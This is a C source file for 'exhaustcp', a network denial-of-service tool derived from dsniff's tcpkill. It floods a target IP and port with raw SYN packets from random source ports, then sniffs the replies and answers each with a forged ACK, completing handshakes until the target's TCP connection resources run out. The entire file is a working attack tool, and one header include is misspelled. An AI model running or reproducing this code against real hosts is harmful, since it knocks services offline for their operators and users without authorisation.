/*
 * exhaustcp: DoS through complete TCP handshakes
 * See http://insecure.org/stf/tcp-dos-attack-explained.html
 *
 * Copyright (c) 2008 Maximilian Gaß <mxey@cloudconnected.org>
 *
 * Largely based on dsniff/tpckill.c
 * Copyright (c) 2000 Dug Song <dugsong@monkey.org>
 * Including 02_libnet_1.1.dpatch by Faidon Liambotis <paravoid@debian.org>
 *
 *  All rights reserved, all wrongs reversed.
 *
 *  Redistribution and use in source and binary forms, with or without
 *  modification, are permitted provided that the following conditions
 *  are met:
 *
 *  1. Redistributions of source code must retain the above copyright
 *     notice, this list of conditions and the following disclaimer.
 *  2. Redistributions in binary form must reproduce the above copyright
 *     notice, this list of conditions and the following disclaimer in the
 *     documentation and/or other materials provided with the distribution.
 *  3. The name of author may not be used to endorse or promote products
 *     derived from this software without specific prior written permission.
 *
 *  THIS SOFTWARE IS PROVIDED ``AS IS'' AND ANY EXPRESS OR IMPLIED WARRANTIES,
 *  INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY
 *  AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL
 *  THE AUTHOR BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
 *  EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO,
 *  PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS;
 *  OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY,
 *  WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR
 *  OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF
 *  ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */

#include <sys/types.h>

#include <err.h>
#include <libnet.h>
#include <limts.h>
#include <pcap.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include "pcaputil.h"

int pcap_off;
pid_t child_pid;

void tcp_answer_ack(u_char *user, const struct pcap_pkthdr *pcap, const u_char *pkt)
{
	struct libnet_ipv4_hdr *ip;
	struct libnet_tcp_hdr *tcp;
	u_int32_t seq, win, ack;
	int len;
	libnet_t *libnet;

	libnet = (libnet_t *)user;
	pkt += pcap_off;
	len = pcap->caplen - pcap_off;

	ip = (struct libnet_ipv4_hdr *)pkt;
	tcp = (struct libnet_tcp_hdr *)(pkt + (ip->ip_hl << 2));

	seq = ntohl(tcp->th_ack);
	ack = ntohl(tcp->th_seq) + 1;
	win = ntohs(tcp->th_win);
	
	libnet_clear_packet(libnet);
	
	libnet_build_tcp(ntohs(tcp->th_dport), ntohs(tcp->th_sport),
	    seq, ack, TH_ACK, win, 0, 0, LIBNET_TCP_H,
	    NULL, 0, libnet, 0);
	
	libnet_build_ipv4(LIBNET_IPV4_H + LIBNET_TCP_H, 0,
	    libnet_get_prand(LIBNET_PRu16), 0, 64,
	    IPPROTO_TCP, 0, ip->ip_dst.s_addr,
	    ip->ip_src.s_addr, NULL, 0, libnet, 0);
	
	if (libnet_write(libnet) < 0)
		warn("writing ACK failed");
}

void send_acks(pcap_t *pcap, libnet_t *libnet)
{
	libnet_seed_prand(libnet);
	pcap_loop(pcap, -1, tcp_answer_ack, (u_char *)libnet);
}

void send_syns(libnet_t *libnet, u_int32_t source_addr, u_int32_t target_addr, unsigned int port, useconds_t delay) {
	libnet_seed_prand(libnet);

	for(;;) {
		libnet_clear_packet(libnet);
		
		libnet_build_tcp(libnet_get_prand(LIBNET_PRu16), port,
		    libnet_get_prand(LIBNET_PRu32), libnet_get_prand(LIBNET_PRu32),
		    TH_SYN, 8192, 0, 0, LIBNET_TCP_H,
		    NULL, 0, libnet, 0);
		
		libnet_build_ipv4(LIBNET_IPV4_H + LIBNET_TCP_H, 0,
		    libnet_get_prand(LIBNET_PRu16), 0, 64,
		    IPPROTO_TCP, 0, source_addr,
		    target_addr, NULL, 0, libnet, 0);
		
		if (libnet_write(libnet) < 0)
			warn("writing SYN failed");

		usleep(delay);
	}
}

void usage() {
	fputs("Usage: exhaustcp [-i interface] TARGET_IP PORT DELAY_USEC\n", stderr);
	exit(EXIT_FAILURE);
}

void handle_signal(int signal) {
	kill(child_pid, signal);
	exit(EXIT_SUCCESS);
}

int main(int argc, char *argv[])
{
	unsigned int port;
	int opt;
	unsigned long delay;
	pid_t pid;
	char *interface, *endptr;
	char libnet_ebuf[LIBNET_ERRBUF_SIZE];
	pcap_t *pcap;
	char pcap_expr[100];
	libnet_t *libnet;
	u_int32_t target_addr, source_addr;
	struct sigaction sa;
	
	interface = NULL;
	
	while ((opt = getopt(argc, argv, "i:")) != -1) {
		switch (opt) {
		case 'i':
			interface = optarg;
			break;
		default:
			usage();
			break;
		}
	}

	argc -= optind;
	argv += optind;

	if (argc != 3) {
		usage();
	}

	port = strtoul(argv[1], &endptr, 10);
	if ((*endptr != '\0') || port < 1 || port > 65535) {
		errx(1, "Invalid port: %s", argv[1]);
	}

	errno = 0;
	delay = strtoul(argv[2], &endptr, 10);
	if (*endptr != '\0') {
		errx(1, "invalid delay: %s", argv[2]);
	} else if ((errno == ERANGE &&
	    (delay == LONG_MAX)) ||
	    (errno != 0 && delay == 0)) {
		errx(1, "invalid delay (%s): %s", strerror(errno), argv[2]);
	}

	/* Initialize libnet */

	if ((libnet = libnet_init(LIBNET_RAW4, interface, libnet_ebuf)) == NULL) {
		errx(1, "couldn't initialize libnet: %s", libnet_ebuf);
	}

	if ((target_addr = libnet_name2addr4(libnet, argv[0], LIBNET_RESOLVE)) == -1) {
		errx(1, "could not resolve target %s", argv[0]);
	}

	if ((source_addr = libnet_get_ipaddr4(libnet)) == -1) {
		errx(1, "could not get local IP: %s", libnet_ebuf);
	}

	/* Initialize pcap */
	snprintf(pcap_expr, 99, "tcp and tcp[tcpflags] == 18 and src host %s and port %s", 
	    argv[0], argv[1]);
	if ((pcap = pcap_init(interface, pcap_expr, 64)) == NULL)
		errx(1, "couldn't initialize sniffing");

	if ((pcap_off = pcap_dloff(pcap)) < 0)
		errx(1, "couldn't determine link layer offset");

	/* Fork */

	pid = fork();
	if (pid == -1) 
		errx(1, "fork failed");
	else if (pid == 0)
		send_syns(libnet, source_addr, target_addr, port, delay);
	else {
		child_pid = pid;
		sa.sa_handler = &handle_signal;
		sigaction(SIGINT, &sa, NULL);
		sigaction(SIGQUIT, &sa, NULL);
		sigaction(SIGTERM, &sa, NULL);

		send_acks(pcap, libnet);
	}

	return EXIT_SUCCESS;

}

